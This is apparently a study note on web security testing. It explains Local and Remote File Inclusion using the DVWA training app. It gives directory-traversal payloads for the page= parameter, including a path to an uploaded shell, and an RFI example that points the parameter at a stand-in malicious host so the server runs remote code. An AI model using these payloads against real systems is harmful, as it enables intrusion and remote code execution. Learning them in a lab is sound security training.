### **LFI (Local File Inclusion)**

- **Definition**: LFI is a web vulnerability that occurs when an attacker can include local files (present on the same server) in the application's execution process.
- **How it works**: The vulnerability arises when the application uses user-supplied input to construct file paths without proper validation or sanitization.

**Steps to test LFI:**

1. In the **Damn Vulnerable Web Application (DVWA)**:
    - Navigate to the **File Inclusion** section.
    - Click on any file to observe its name being displayed in the URL (e.g., `file4.php`).
2. Try manipulating the `page=` parameter in the URL by providing file paths:
    - Example 1: `../../hackable/flags/fi.php`
    - Example 2: `../../hackable/uploads/ak47shell.php`

These examples demonstrate LFI as they attempt to include files from the local server's directories.

### **RFI (Remote File Inclusion)**

- **Definition**: RFI is a vulnerability that allows an attacker to include files hosted on external servers.
- **How it works**: If the application allows URLs or external file paths as input, the attacker can inject a URL pointing to a malicious script hosted elsewhere.

**Steps to test RFI:**

1. Identify parameters that accept file paths or URLs.
2. Replace them with a remote URL hosting a malicious file or script.

Example: If a parameter like `page=` is vulnerable, injecting a URL like `http://malicious-site.com/malicious-file.php` will include and execute the remote file on the server.

### **Key Difference Between LFI and RFI**

|Aspect|LFI (Local File Inclusion)|RFI (Remote File Inclusion)|
|---|---|---|
|**File Location**|Includes files from the server's local system.|Includes files from external, remote sources.|
|**Risk**|Limited to the server's accessible directories.|Expands the attack surface to external threats.|
|**Examples**|`../../file_path` manipulations.|URLs like `http://example.com/malicious.php`.|
